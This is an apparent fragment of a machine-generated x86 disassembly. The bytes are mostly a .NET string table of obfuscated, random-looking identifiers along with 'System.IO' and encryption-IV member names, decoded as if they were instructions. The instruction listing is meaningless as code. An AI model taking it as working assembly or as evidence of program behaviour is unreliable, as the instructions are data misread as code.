  407bfa:	6f                   	outsl  %ds:(%esi),(%dx)
  407bfb:	58                   	pop    %eax
  407bfc:	50                   	push   %eax
  407bfd:	53                   	push   %ebx
  407bfe:	65 73 50             	gs jae 0x407c51
  407c01:	56                   	push   %esi
  407c02:	4b                   	dec    %ebx
  407c03:	00 65 63             	add    %ah,0x63(%ebp)
  407c06:	62 42 76             	bound  %eax,0x76(%edx)
  407c09:	43                   	inc    %ebx
  407c0a:	7a 75                	jp     0x407c81
  407c0c:	77 76                	ja     0x407c84
  407c0e:	61                   	popa
  407c0f:	4b                   	dec    %ebx
  407c10:	00 4b 78             	add    %cl,0x78(%ebx)
  407c13:	57                   	push   %edi
  407c14:	4a                   	dec    %edx
  407c15:	6d                   	insl   (%dx),%es:(%edi)
  407c16:	66 44                	inc    %sp
  407c18:	79 61                	jns    0x407c7b
  407c1a:	7a 49                	jp     0x407c65
  407c1c:	6a 4b                	push   $0x4b
  407c1e:	00 4f 74             	add    %cl,0x74(%edi)
  407c21:	4f                   	dec    %edi
  407c22:	68 4b 76 52 50       	push   $0x5052764b
  407c27:	6e                   	outsb  %ds:(%esi),(%dx)
  407c28:	63 6d 4b             	arpl   %ebp,0x4b(%ebp)
  407c2b:	00 50 61             	add    %dl,0x61(%eax)
  407c2e:	49                   	dec    %ecx
  407c2f:	49                   	dec    %ecx
  407c30:	77 68                	ja     0x407c9a
  407c32:	7a 79                	jp     0x407cad
  407c34:	6e                   	outsb  %ds:(%esi),(%dx)
  407c35:	6b 72 4b 00          	imul   $0x0,0x4b(%edx),%esi
  407c39:	65 53                	gs push %ebx
  407c3b:	46                   	inc    %esi
  407c3c:	71 6f                	jno    0x407cad
  407c3e:	6d                   	insl   (%dx),%es:(%edi)
  407c3f:	6b 74 6e 7a 4b       	imul   $0x4b,0x7a(%esi,%ebp,2),%esi
  407c44:	00 41 64             	add    %al,0x64(%ecx)
  407c47:	71 71                	jno    0x407cba
  407c49:	65 52                	gs push %edx
  407c4b:	74 53                	je     0x407ca0
  407c4d:	62 7a 64             	bound  %edi,0x64(%edx)
  407c50:	78 45                	js     0x407c97
  407c52:	4c                   	dec    %esp
  407c53:	00 67 64             	add    %ah,0x64(%edi)
  407c56:	46                   	inc    %esi
  407c57:	79 4c                	jns    0x407ca5
  407c59:	54                   	push   %esp
  407c5a:	55                   	push   %ebp
  407c5b:	75 6a                	jne    0x407cc7
  407c5d:	43                   	inc    %ebx
  407c5e:	46                   	inc    %esi
  407c5f:	4c                   	dec    %esp
  407c60:	00 61 5a             	add    %ah,0x5a(%ecx)
  407c63:	71 53                	jno    0x407cb8
  407c65:	70 46                	jo     0x407cad
  407c67:	5a                   	pop    %edx
  407c68:	50                   	push   %eax
  407c69:	4c                   	dec    %esp
  407c6a:	6c                   	insb   (%dx),%es:(%edi)
  407c6b:	48                   	dec    %eax
  407c6c:	4c                   	dec    %esp
  407c6d:	00 76 50             	add    %dh,0x50(%esi)
  407c70:	72 7a                	jb     0x407cec
  407c72:	6e                   	outsb  %ds:(%esi),(%dx)
  407c73:	6e                   	outsb  %ds:(%esi),(%dx)
  407c74:	4d                   	dec    %ebp
  407c75:	42                   	inc    %edx
  407c76:	72 46                	jb     0x407cbe
  407c78:	49                   	dec    %ecx
  407c79:	75 6b                	jne    0x407ce6
  407c7b:	50                   	push   %eax
  407c7c:	4c                   	dec    %esp
  407c7d:	00 78 66             	add    %bh,0x66(%eax)
  407c80:	6b 5a 52 61          	imul   $0x61,0x52(%edx),%ebx
  407c84:	65 67 68 56 51 4c 00 	gs addr16 push $0x4c5156
  407c8b:	7a 71                	jp     0x407cfe
  407c8d:	52                   	push   %edx
  407c8e:	67 4a                	addr16 dec %edx
  407c90:	67 76 76             	addr16 jbe 0x407d09
  407c93:	54                   	push   %esp
  407c94:	4c                   	dec    %esp
  407c95:	00 6a 43             	add    %ch,0x43(%edx)
  407c98:	61                   	popa
  407c99:	44                   	inc    %esp
  407c9a:	4c                   	dec    %esp
  407c9b:	4a                   	dec    %edx
  407c9c:	41                   	inc    %ecx
  407c9d:	4d                   	dec    %ebp
  407c9e:	57                   	push   %edi
  407c9f:	4c                   	dec    %esp
  407ca0:	00 43 73             	add    %al,0x73(%ebx)
  407ca3:	43                   	inc    %ebx
  407ca4:	62 63 6d             	bound  %esp,0x6d(%ebx)
  407ca7:	54                   	push   %esp
  407ca8:	6d                   	insl   (%dx),%es:(%edi)
  407ca9:	47                   	inc    %edi
  407caa:	68 73 5a 68 4c       	push   $0x4c685a73
  407caf:	00 65 71             	add    %ah,0x71(%ebp)
  407cb2:	4c                   	dec    %esp
  407cb3:	79 41                	jns    0x407cf6
  407cb5:	52                   	push   %edx
  407cb6:	58                   	pop    %eax
  407cb7:	63 56 6b             	arpl   %edx,0x6b(%esi)
  407cba:	6e                   	outsb  %ds:(%esi),(%dx)
  407cbb:	4c                   	dec    %esp
  407cbc:	00 4b 47             	add    %cl,0x47(%ebx)
  407cbf:	58                   	pop    %eax
  407cc0:	63 55 5a             	arpl   %edx,0x5a(%ebp)
  407cc3:	54                   	push   %esp
  407cc4:	6a 76                	push   $0x76
  407cc6:	4c                   	dec    %esp
  407cc7:	00 5a 46             	add    %bl,0x46(%edx)
  407cca:	54                   	push   %esp
  407ccb:	4e                   	dec    %esi
  407ccc:	6f                   	outsl  %ds:(%esi),(%dx)
  407ccd:	65 51                	gs push %ecx
  407ccf:	71 5a                	jno    0x407d2b
  407cd1:	4e                   	dec    %esi
  407cd2:	7a 79                	jp     0x407d4d
  407cd4:	4c                   	dec    %esp
  407cd5:	00 79 44             	add    %bh,0x44(%ecx)
  407cd8:	71 50                	jno    0x407d2a
  407cda:	49                   	dec    %ecx
  407cdb:	4a                   	dec    %edx
  407cdc:	4e                   	dec    %esi
  407cdd:	76 51                	jbe    0x407d30
  407cdf:	47                   	inc    %edi
  407ce0:	52                   	push   %edx
  407ce1:	42                   	inc    %edx
  407ce2:	4d                   	dec    %ebp
  407ce3:	00 57 6b             	add    %dl,0x6b(%edi)
  407ce6:	4b                   	dec    %ebx
  407ce7:	49                   	dec    %ecx
  407ce8:	41                   	inc    %ecx
  407ce9:	4b                   	dec    %ebx
  407cea:	4e                   	dec    %esi
  407ceb:	52                   	push   %edx
  407cec:	78 63                	js     0x407d51
  407cee:	47                   	inc    %edi
  407cef:	70 4d                	jo     0x407d3e
  407cf1:	4d                   	dec    %ebp
  407cf2:	00 53 4e             	add    %dl,0x4e(%ebx)
  407cf5:	66 49                	dec    %cx
  407cf7:	42                   	inc    %edx
  407cf8:	69 59 69 62 4d 00 76 	imul   $0x76004d62,0x69(%ecx),%ebx
  407cff:	5a                   	pop    %edx
  407d00:	78 6b                	js     0x407d6d
  407d02:	6c                   	insb   (%dx),%es:(%edi)
  407d03:	71 63                	jno    0x407d68
  407d05:	42                   	inc    %edx
  407d06:	4e                   	dec    %esi
  407d07:	6e                   	outsb  %ds:(%esi),(%dx)
  407d08:	67 4d                	addr16 dec %ebp
  407d0a:	00 47 46             	add    %al,0x46(%edi)
  407d0d:	6d                   	insl   (%dx),%es:(%edi)
  407d0e:	48                   	dec    %eax
  407d0f:	50                   	push   %eax
  407d10:	6f                   	outsl  %ds:(%esi),(%dx)
  407d11:	59                   	pop    %ecx
  407d12:	5a                   	pop    %edx
  407d13:	78 70                	js     0x407d85
  407d15:	74 4d                	je     0x407d64
  407d17:	00 4b 78             	add    %cl,0x78(%ebx)
  407d1a:	4d                   	dec    %ebp
  407d1b:	57                   	push   %edi
  407d1c:	63 71 42             	arpl   %esi,0x42(%ecx)
  407d1f:	70 79                	jo     0x407d9a
  407d21:	4d                   	dec    %ebp
  407d22:	00 55 53             	add    %dl,0x53(%ebp)
  407d25:	66 6d                	insw   (%dx),%es:(%edi)
  407d27:	7a 75                	jp     0x407d9e
  407d29:	61                   	popa
  407d2a:	77 42                	ja     0x407d6e
  407d2c:	48                   	dec    %eax
  407d2d:	4e                   	dec    %esi
  407d2e:	00 48 48             	add    %cl,0x48(%eax)
  407d31:	47                   	inc    %edi
  407d32:	71 55                	jno    0x407d89
  407d34:	66 6e                	data16 outsb %ds:(%esi),(%dx)
  407d36:	61                   	popa
  407d37:	50                   	push   %eax
  407d38:	6e                   	outsb  %ds:(%esi),(%dx)
  407d39:	59                   	pop    %ecx
  407d3a:	58                   	pop    %eax
  407d3b:	4e                   	dec    %esi
  407d3c:	00 47 58             	add    %al,0x58(%edi)
  407d3f:	64 6c                	fs insb (%dx),%es:(%edi)
  407d41:	6b 74 46 64 4d       	imul   $0x4d,0x64(%esi,%eax,2),%esi
  407d46:	64 4e                	fs dec %esi
  407d48:	00 6a 41             	add    %ch,0x41(%edx)
  407d4b:	56                   	push   %esi
  407d4c:	59                   	pop    %ecx
  407d4d:	64 65 67 77 6b       	fs gs addr16 ja 0x407dbd
  407d52:	6d                   	insl   (%dx),%es:(%edi)
  407d53:	65 73 73             	gs jae 0x407dc9
  407d56:	70 4e                	jo     0x407da6
  407d58:	00 70 64             	add    %dh,0x64(%eax)
  407d5b:	54                   	push   %esp
  407d5c:	67 4a                	addr16 dec %edx
  407d5e:	43                   	inc    %ebx
  407d5f:	4c                   	dec    %esp
  407d60:	74 79                	je     0x407ddb
  407d62:	4e                   	dec    %esi
  407d63:	00 63 54             	add    %ah,0x54(%ebx)
  407d66:	78 63                	js     0x407dcb
  407d68:	6f                   	outsl  %ds:(%esi),(%dx)
  407d69:	66 6f                	outsw  %ds:(%esi),(%dx)
  407d6b:	42                   	inc    %edx
  407d6c:	55                   	push   %ebp
  407d6d:	54                   	push   %esp
  407d6e:	6a 4a                	push   $0x4a
  407d70:	45                   	inc    %ebp
  407d71:	4f                   	dec    %edi
  407d72:	00 45 59             	add    %al,0x59(%ebp)
  407d75:	49                   	dec    %ecx
  407d76:	58                   	pop    %eax
  407d77:	6f                   	outsl  %ds:(%esi),(%dx)
  407d78:	53                   	push   %ebx
  407d79:	44                   	inc    %esp
  407d7a:	77 64                	ja     0x407de0
  407d7c:	47                   	inc    %edi
  407d7d:	68 4b 48 4f 00       	push   $0x4f484b
  407d82:	53                   	push   %ebx
  407d83:	79 73                	jns    0x407df8
  407d85:	74 65                	je     0x407dec
  407d87:	6d                   	insl   (%dx),%es:(%edi)
  407d88:	2e 49                	cs dec %ecx
  407d8a:	4f                   	dec    %edi
  407d8b:	00 4a 54             	add    %cl,0x54(%edx)
  407d8e:	53                   	push   %ebx
  407d8f:	48                   	dec    %eax
  407d90:	4b                   	dec    %ebx
  407d91:	62 56 50             	bound  %edx,0x50(%esi)
  407d94:	67 67 66 4f          	addr16 addr16 dec %di
  407d98:	00 64 52 46          	add    %ah,0x46(%edx,%edx,2)
  407d9c:	69 77 49 68 54 77 71 	imul   $0x71775468,0x49(%edi),%esi
  407da3:	7a 4f                	jp     0x407df4
  407da5:	00 46 79             	add    %al,0x79(%esi)
  407da8:	51                   	push   %ecx
  407da9:	55                   	push   %ebp
  407daa:	64 6b 70 43 4a       	imul   $0x4a,%fs:0x43(%eax),%esi
  407daf:	42                   	inc    %edx
  407db0:	76 52                	jbe    0x407e04
  407db2:	45                   	inc    %ebp
  407db3:	41                   	inc    %ecx
  407db4:	44                   	inc    %esp
  407db5:	50                   	push   %eax
  407db6:	00 52 6b             	add    %dl,0x6b(%edx)
  407db9:	6f                   	outsl  %ds:(%esi),(%dx)
  407dba:	56                   	push   %esi
  407dbb:	79 4a                	jns    0x407e07
  407dbd:	6e                   	outsb  %ds:(%esi),(%dx)
  407dbe:	6f                   	outsl  %ds:(%esi),(%dx)
  407dbf:	47                   	inc    %edi
  407dc0:	66 69 4f 4c 43 73    	imul   $0x7343,0x4c(%edi),%cx
  407dc6:	4b                   	dec    %ebx
  407dc7:	50                   	push   %eax
  407dc8:	00 79 72             	add    %bh,0x72(%ecx)
  407dcb:	76 77                	jbe    0x407e44
  407dcd:	6d                   	insl   (%dx),%es:(%edi)
  407dce:	75 6d                	jne    0x407e3d
  407dd0:	68 70 50 4c 6d       	push   $0x6d4c5070
  407dd5:	4f                   	dec    %edi
  407dd6:	50                   	push   %eax
  407dd7:	00 7a 6c             	add    %bh,0x6c(%edx)
  407dda:	4f                   	dec    %edi
  407ddb:	72 50                	jb     0x407e2d
  407ddd:	70 43                	jo     0x407e22
  407ddf:	6a 51                	push   $0x51
  407de1:	6c                   	insb   (%dx),%es:(%edi)
  407de2:	48                   	dec    %eax
  407de3:	52                   	push   %edx
  407de4:	58                   	pop    %eax
  407de5:	50                   	push   %eax
  407de6:	00 6c 66 64          	add    %ch,0x64(%esi,%eiz,2)
  407dea:	73 50                	jae    0x407e3c
  407dec:	74 6a                	je     0x407e58
  407dee:	4f                   	dec    %edi
  407def:	4a                   	dec    %edx
  407df0:	66 43                	inc    %bx
  407df2:	53                   	push   %ebx
  407df3:	6b 65 61 50          	imul   $0x50,0x61(%ebp),%esp
  407df7:	00 55 73             	add    %dl,0x73(%ebp)
  407dfa:	42                   	inc    %edx
  407dfb:	63 48 74             	arpl   %ecx,0x74(%eax)
  407dfe:	63 7a 4a             	arpl   %edi,0x4a(%edx)
  407e01:	4d                   	dec    %ebp
  407e02:	41                   	inc    %ecx
  407e03:	63 51 59             	arpl   %edx,0x59(%ecx)
  407e06:	71 5a                	jno    0x407e62
  407e08:	6c                   	insb   (%dx),%es:(%edi)
  407e09:	50                   	push   %eax
  407e0a:	00 5a 55             	add    %bl,0x55(%edx)
  407e0d:	4d                   	dec    %ebp
  407e0e:	4c                   	dec    %esp
  407e0f:	66 41                	inc    %cx
  407e11:	51                   	push   %ecx
  407e12:	54                   	push   %esp
  407e13:	52                   	push   %edx
  407e14:	6e                   	outsb  %ds:(%esi),(%dx)
  407e15:	79 66                	jns    0x407e7d
  407e17:	6d                   	insl   (%dx),%es:(%edi)
  407e18:	50                   	push   %eax
  407e19:	00 4d 43             	add    %cl,0x43(%ebp)
  407e1c:	5a                   	pop    %edx
  407e1d:	51                   	push   %ecx
  407e1e:	53                   	push   %ebx
  407e1f:	5a                   	pop    %edx
  407e20:	56                   	push   %esi
  407e21:	76 70                	jbe    0x407e93
  407e23:	64 6e                	outsb  %fs:(%esi),(%dx)
  407e25:	50                   	push   %eax
  407e26:	00 69 68             	add    %ch,0x68(%ecx)
  407e29:	59                   	pop    %ecx
  407e2a:	51                   	push   %ecx
  407e2b:	58                   	pop    %eax
  407e2c:	6a 69                	push   $0x69
  407e2e:	45                   	inc    %ebp
  407e2f:	4c                   	dec    %esp
  407e30:	51                   	push   %ecx
  407e31:	00 6f 68             	add    %ch,0x68(%edi)
  407e34:	55                   	push   %ebp
  407e35:	70 4e                	jo     0x407e85
  407e37:	72 52                	jb     0x407e8b
  407e39:	55                   	push   %ebp
  407e3a:	7a 46                	jp     0x407e82
  407e3c:	6c                   	insb   (%dx),%es:(%edi)
  407e3d:	53                   	push   %ebx
  407e3e:	51                   	push   %ecx
  407e3f:	00 6e 74             	add    %ch,0x74(%esi)
  407e42:	73 50                	jae    0x407e94
  407e44:	72 58                	jb     0x407e9e
  407e46:	68 51 45 58 50       	push   $0x50584551
  407e4b:	4e                   	dec    %esi
  407e4c:	56                   	push   %esi
  407e4d:	51                   	push   %ecx
  407e4e:	00 52 58             	add    %dl,0x58(%edx)
  407e51:	42                   	inc    %edx
  407e52:	78 75                	js     0x407ec9
  407e54:	66 6d                	insw   (%dx),%es:(%edi)
  407e56:	45                   	inc    %ebp
  407e57:	4e                   	dec    %esi
  407e58:	70 6c                	jo     0x407ec6
  407e5a:	51                   	push   %ecx
  407e5b:	00 68 4f             	add    %ch,0x4f(%eax)
  407e5e:	41                   	inc    %ecx
  407e5f:	47                   	inc    %edi
  407e60:	6b 42 4a 65          	imul   $0x65,0x4a(%edx),%eax
  407e64:	4c                   	dec    %esp
  407e65:	4e                   	dec    %esi
  407e66:	77 6c                	ja     0x407ed4
  407e68:	51                   	push   %ecx
  407e69:	00 64 55 75          	add    %ah,0x75(%ebp,%edx,2)
  407e6d:	58                   	pop    %eax
  407e6e:	74 44                	je     0x407eb4
  407e70:	58                   	pop    %eax
  407e71:	61                   	popa
  407e72:	45                   	inc    %ebp
  407e73:	68 70 51 00 61       	push   $0x61005170
  407e78:	76 64                	jbe    0x407ede
  407e7a:	6e                   	outsb  %ds:(%esi),(%dx)
  407e7b:	6e                   	outsb  %ds:(%esi),(%dx)
  407e7c:	62 59 6e             	bound  %ebx,0x6e(%ecx)
  407e7f:	4d                   	dec    %ebp
  407e80:	4b                   	dec    %ebx
  407e81:	78 51                	js     0x407ed4
  407e83:	00 4a 46             	add    %cl,0x46(%edx)
  407e86:	68 58 4d 6d 4d       	push   $0x4d6d4d58
  407e8b:	4a                   	dec    %edx
  407e8c:	51                   	push   %ecx
  407e8d:	52                   	push   %edx
  407e8e:	00 55 43             	add    %dl,0x43(%ebp)
  407e91:	55                   	push   %ebp
  407e92:	45                   	inc    %ebp
  407e93:	4a                   	dec    %edx
  407e94:	55                   	push   %ebp
  407e95:	6d                   	insl   (%dx),%es:(%edi)
  407e96:	6d                   	insl   (%dx),%es:(%edi)
  407e97:	46                   	inc    %esi
  407e98:	7a 4a                	jp     0x407ee4
  407e9a:	51                   	push   %ecx
  407e9b:	52                   	push   %edx
  407e9c:	00 4d 4a             	add    %cl,0x4a(%ebp)
  407e9f:	56                   	push   %esi
  407ea0:	76 4b                	jbe    0x407eed
  407ea2:	6f                   	outsl  %ds:(%esi),(%dx)
  407ea3:	7a 43                	jp     0x407ee8
  407ea5:	69 68 66 51 52 00 44 	imul   $0x44005251,0x66(%eax),%ebp
  407eac:	77 57                	ja     0x407f05
  407eae:	45                   	inc    %ebp
  407eaf:	59                   	pop    %ecx
  407eb0:	4e                   	dec    %esi
  407eb1:	57                   	push   %edi
  407eb2:	51                   	push   %ecx
  407eb3:	7a 55                	jp     0x407f0a
  407eb5:	41                   	inc    %ecx
  407eb6:	54                   	push   %esp
  407eb7:	52                   	push   %edx
  407eb8:	00 66 75             	add    %ah,0x75(%esi)
  407ebb:	49                   	dec    %ecx
  407ebc:	47                   	inc    %edi
  407ebd:	4a                   	dec    %edx
  407ebe:	62 75 70             	bound  %esi,0x70(%ebp)
  407ec1:	6f                   	outsl  %ds:(%esi),(%dx)
  407ec2:	56                   	push   %esi
  407ec3:	52                   	push   %edx
  407ec4:	00 74 44 79          	add    %dh,0x79(%esp,%eax,2)
  407ec8:	64 47                	fs inc %edi
  407eca:	4f                   	dec    %edi
  407ecb:	54                   	push   %esp
  407ecc:	54                   	push   %esp
  407ecd:	70 69                	jo     0x407f38
  407ecf:	66 47                	inc    %di
  407ed1:	59                   	pop    %ecx
  407ed2:	52                   	push   %edx
  407ed3:	00 6d 52             	add    %ch,0x52(%ebp)
  407ed6:	63 70 70             	arpl   %esi,0x70(%eax)
  407ed9:	61                   	popa
  407eda:	58                   	pop    %eax
  407edb:	61                   	popa
  407edc:	52                   	push   %edx
  407edd:	6d                   	insl   (%dx),%es:(%edi)
  407ede:	52                   	push   %edx
  407edf:	00 5a 6e             	add    %bl,0x6e(%edx)
  407ee2:	56                   	push   %esi
  407ee3:	58                   	pop    %eax
  407ee4:	63 6f 4b             	arpl   %ebp,0x4b(%edi)
  407ee7:	43                   	inc    %ebx
  407ee8:	75 52                	jne    0x407f3c
  407eea:	00 51 70             	add    %dl,0x70(%ecx)
  407eed:	49                   	dec    %ecx
  407eee:	4f                   	dec    %edi
  407eef:	5a                   	pop    %edx
  407ef0:	4d                   	dec    %ebp
  407ef1:	7a 54                	jp     0x407f47
  407ef3:	68 78 52 00 4f       	push   $0x4f005278
  407ef8:	73 43                	jae    0x407f3d
  407efa:	67 48                	addr16 dec %eax
  407efc:	48                   	dec    %eax
  407efd:	61                   	popa
  407efe:	51                   	push   %ecx
  407eff:	70 79                	jo     0x407f7a
  407f01:	52                   	push   %edx
  407f02:	00 4c 61 64          	add    %cl,0x64(%ecx,%eiz,2)
  407f06:	41                   	inc    %ecx
  407f07:	6f                   	outsl  %ds:(%esi),(%dx)
  407f08:	59                   	pop    %ecx
  407f09:	68 4f 44 49 4f       	push   $0x4f49444f
  407f0e:	53                   	push   %ebx
  407f0f:	00 56 4e             	add    %dl,0x4e(%esi)
  407f12:	64 79 78             	fs jns 0x407f8d
  407f15:	6c                   	insb   (%dx),%es:(%edi)
  407f16:	72 62                	jb     0x407f7a
  407f18:	68 47 61 53 00       	push   $0x536147
  407f1d:	63 67 43             	arpl   %esp,0x43(%edi)
  407f20:	50                   	push   %eax
  407f21:	43                   	inc    %ebx
  407f22:	65 6e                	outsb  %gs:(%esi),(%dx)
  407f24:	56                   	push   %esi
  407f25:	63 53 00             	arpl   %edx,0x0(%ebx)
  407f28:	64 61                	fs popa
  407f2a:	4e                   	dec    %esi
  407f2b:	7a 59                	jp     0x407f86
  407f2d:	63 73 4e             	arpl   %esi,0x4e(%ebx)
  407f30:	6a 5a                	push   $0x5a
  407f32:	6a 49                	push   $0x49
  407f34:	4f                   	dec    %edi
  407f35:	6c                   	insb   (%dx),%es:(%edi)
  407f36:	53                   	push   %ebx
  407f37:	00 41 61             	add    %al,0x61(%ecx)
  407f3a:	76 46                	jbe    0x407f82
  407f3c:	4e                   	dec    %esi
  407f3d:	72 4b                	jb     0x407f8a
  407f3f:	5a                   	pop    %edx
  407f40:	56                   	push   %esi
  407f41:	7a 57                	jp     0x407f9a
  407f43:	6d                   	insl   (%dx),%es:(%edi)
  407f44:	53                   	push   %ebx
  407f45:	00 45 48             	add    %al,0x48(%ebp)
  407f48:	74 59                	je     0x407fa3
  407f4a:	6d                   	insl   (%dx),%es:(%edi)
  407f4b:	49                   	dec    %ecx
  407f4c:	50                   	push   %eax
  407f4d:	74 59                	je     0x407fa8
  407f4f:	6d                   	insl   (%dx),%es:(%edi)
  407f50:	53                   	push   %ebx
  407f51:	00 59 79             	add    %bl,0x79(%ecx)
  407f54:	66 47                	inc    %di
  407f56:	42                   	inc    %edx
  407f57:	76 78                	jbe    0x407fd1
  407f59:	4c                   	dec    %esp
  407f5a:	73 79                	jae    0x407fd5
  407f5c:	68 6e 53 00 47       	push   $0x4700536e
  407f61:	67 76 47             	addr16 jbe 0x407fab
  407f64:	59                   	pop    %ecx
  407f65:	49                   	dec    %ecx
  407f66:	49                   	dec    %ecx
  407f67:	6c                   	insb   (%dx),%es:(%edi)
  407f68:	55                   	push   %ebp
  407f69:	53                   	push   %ebx
  407f6a:	75 53                	jne    0x407fbf
  407f6c:	00 6e 76             	add    %ch,0x76(%esi)
  407f6f:	44                   	inc    %esp
  407f70:	6e                   	outsb  %ds:(%esi),(%dx)
  407f71:	6d                   	insl   (%dx),%es:(%edi)
  407f72:	48                   	dec    %eax
  407f73:	45                   	inc    %ebp
  407f74:	4f                   	dec    %edi
  407f75:	4f                   	dec    %edi
  407f76:	6d                   	insl   (%dx),%es:(%edi)
  407f77:	7a 53                	jp     0x407fcc
  407f79:	00 4c 59 6a          	add    %cl,0x6a(%ecx,%ebx,2)
  407f7d:	46                   	inc    %esi
  407f7e:	61                   	popa
  407f7f:	76 55                	jbe    0x407fd6
  407f81:	75 4c                	jne    0x407fcf
  407f83:	41                   	inc    %ecx
  407f84:	54                   	push   %esp
  407f85:	00 57 5a             	add    %dl,0x5a(%edi)
  407f88:	42                   	inc    %edx
  407f89:	4f                   	dec    %edi
  407f8a:	64 72 6a             	fs jb  0x407ff7
  407f8d:	77 63                	ja     0x407ff2
  407f8f:	48                   	dec    %eax
  407f90:	54                   	push   %esp
  407f91:	00 66 64             	add    %ah,0x64(%esi)
  407f94:	57                   	push   %edi
  407f95:	59                   	pop    %ecx
  407f96:	46                   	inc    %esi
  407f97:	51                   	push   %ecx
  407f98:	57                   	push   %edi
  407f99:	4e                   	dec    %esi
  407f9a:	59                   	pop    %ecx
  407f9b:	51                   	push   %ecx
  407f9c:	54                   	push   %esp
  407f9d:	00 47 56             	add    %al,0x56(%edi)
  407fa0:	4e                   	dec    %esi
  407fa1:	65 54                	gs push %esp
  407fa3:	6f                   	outsl  %ds:(%esi),(%dx)
  407fa4:	68 72 70 6a 54       	push   $0x546a7072
  407fa9:	00 4a 4f             	add    %cl,0x4f(%edx)
  407fac:	6c                   	insb   (%dx),%es:(%edi)
  407fad:	59                   	pop    %ecx
  407fae:	61                   	popa
  407faf:	77 4d                	ja     0x407ffe
  407fb1:	51                   	push   %ecx
  407fb2:	4c                   	dec    %esp
  407fb3:	75 54                	jne    0x408009
  407fb5:	00 43 55             	add    %al,0x55(%ebx)
  407fb8:	79 5a                	jns    0x408014
  407fba:	6c                   	insb   (%dx),%es:(%edi)
  407fbb:	76 4a                	jbe    0x408007
  407fbd:	75 4d                	jne    0x40800c
  407fbf:	70 55                	jo     0x408016
  407fc1:	55                   	push   %ebp
  407fc2:	00 4e 53             	add    %cl,0x53(%esi)
  407fc5:	76 63                	jbe    0x40802a
  407fc7:	67 42                	addr16 inc %edx
  407fc9:	41                   	inc    %ecx
  407fca:	74 78                	je     0x408044
  407fcc:	4b                   	dec    %ebx
  407fcd:	62 65 55             	bound  %esp,0x55(%ebp)
  407fd0:	00 4e 4f             	add    %cl,0x4f(%esi)
  407fd3:	52                   	push   %edx
  407fd4:	65 62 55 4b          	bound  %edx,%gs:0x4b(%ebp)
  407fd8:	57                   	push   %edi
  407fd9:	62 57 79             	bound  %edx,0x79(%edi)
  407fdc:	77 71                	ja     0x40804f
  407fde:	55                   	push   %ebp
  407fdf:	00 6e 51             	add    %ch,0x51(%esi)
  407fe2:	47                   	inc    %edi
  407fe3:	79 50                	jns    0x408035
  407fe5:	50                   	push   %eax
  407fe6:	4a                   	dec    %edx
  407fe7:	70 77                	jo     0x408060
  407fe9:	6a 64                	push   $0x64
  407feb:	47                   	inc    %edi
  407fec:	56                   	push   %esi
  407fed:	00 67 65             	add    %ah,0x65(%edi)
  407ff0:	74 5f                	je     0x408051
  407ff2:	49                   	dec    %ecx
  407ff3:	56                   	push   %esi
  407ff4:	00 73 65             	add    %dh,0x65(%ebx)
  407ff7:	74 5f                	je     0x408058
  407ff9:	49                   	dec    %ecx
  407ffa:	56                   	push   %esi
  407ffb:	00 47 65             	add    %al,0x65(%edi)
  407ffe:	6e                   	outsb  %ds:(%esi),(%dx)
  407fff:	65 72 61             	gs jb  0x408063
  408002:	74 65                	je     0x408069
  408004:	49                   	dec    %ecx
  408005:	56                   	push   %esi
  408006:	00 70 78             	add    %dh,0x78(%eax)
  408009:	4a                   	dec    %edx
  40800a:	56                   	push   %esi
  40800b:	43                   	inc    %ebx
  40800c:	4e                   	dec    %esi
  40800d:	65 52                	gs push %edx
  40800f:	41                   	inc    %ecx
  408010:	54                   	push   %esp
  408011:	42                   	inc    %edx
  408012:	71 4a                	jno    0x40805e
  408014:	56                   	push   %esi
  408015:	00 6e 68             	add    %ch,0x68(%esi)
  408018:	4f                   	dec    %edi
  408019:	70 70                	jo     0x40808b
  40801b:	69 4c 58 65 58 7a 50 	imul   $0x41507a58,0x65(%eax,%ebx,2),%ecx
  408022:	41 
  408023:	52                   	push   %edx
  408024:	55                   	push   %ebp
  408025:	56                   	push   %esi
  408026:	00 49 61             	add    %cl,0x61(%ecx)
  408029:	68 78 42 61 79       	push   $0x79614278
  40802e:	64 76 66             	fs jbe 0x408097
  408031:	56                   	push   %esi
  408032:	00 51 52             	add    %dl,0x52(%ecx)
  408035:	6c                   	insb   (%dx),%es:(%edi)
  408036:	4e                   	dec    %esi
  408037:	56                   	push   %esi
  408038:	7a 64                	jp     0x40809e
  40803a:	79 72                	jns    0x4080ae
  40803c:	44                   	inc    %esp
  40803d:	59                   	pop    %ecx
  40803e:	4d                   	dec    %ebp
  40803f:	68 56 00 61 43       	push   $0x43610056
  408044:	46                   	inc    %esi
  408045:	65 78 53             	gs js  0x40809b
  408048:	57                   	push   %edi
  408049:	54                   	push   %esp
  40804a:	77 6f                	ja     0x4080bb
  40804c:	54                   	push   %esp
  40804d:	76 56                	jbe    0x4080a5
  40804f:	00 4a 43             	add    %cl,0x43(%edx)
  408052:	41                   	inc    %ecx
  408053:	78 6e                	js     0x4080c3
  408055:	4b                   	dec    %ebx
  408056:	6f                   	outsl  %ds:(%esi),(%dx)
  408057:	47                   	inc    %edi
  408058:	43                   	inc    %ebx
  408059:	6e                   	outsb  %ds:(%esi),(%dx)
  40805a:	72 57                	jb     0x4080b3
  40805c:	58                   	pop    %eax
  40805d:	66 76 78             	data16 jbe 0x4080d8
  408060:	56                   	push   %esi
  408061:	00 58 64             	add    %bl,0x64(%eax)
  408064:	62 62 53             	bound  %esp,0x53(%edx)
  408067:	41                   	inc    %ecx
  408068:	4e                   	dec    %esi
  408069:	68 6e 5a 63 65       	push   $0x65635a6e
  40806e:	41                   	inc    %ecx
  40806f:	57                   	push   %edi
  408070:	00 6e 51             	add    %ch,0x51(%esi)
  408073:	47                   	inc    %edi
  408074:	67 52                	addr16 push %edx
  408076:	4d                   	dec    %ebp
  408077:	65 4a                	gs dec %edx
  408079:	7a 6b                	jp     0x4080e6
  40807b:	6c                   	insb   (%dx),%es:(%edi)
  40807c:	41                   	inc    %ecx
  40807d:	57                   	push   %edi
  40807e:	00 45 78             	add    %al,0x78(%ebp)
  408081:	42                   	inc    %edx
  408082:	74 41                	je     0x4080c5
  408084:	69 67 4c 54 4d 63 57 	imul   $0x57634d54,0x4c(%edi),%esp
  40808b:	00 76 71             	add    %dh,0x71(%esi)
  40808e:	6a 6d                	push   $0x6d
  408090:	53                   	push   %ebx
  408091:	47                   	inc    %edi
  408092:	69 76 44 54 7a 63 57 	imul   $0x57637a54,0x44(%esi),%esi
  408099:	00 55 50             	add    %dl,0x50(%ebp)
  40809c:	4c                   	dec    %esp
  40809d:	49                   	dec    %ecx
  40809e:	43                   	inc    %ebx
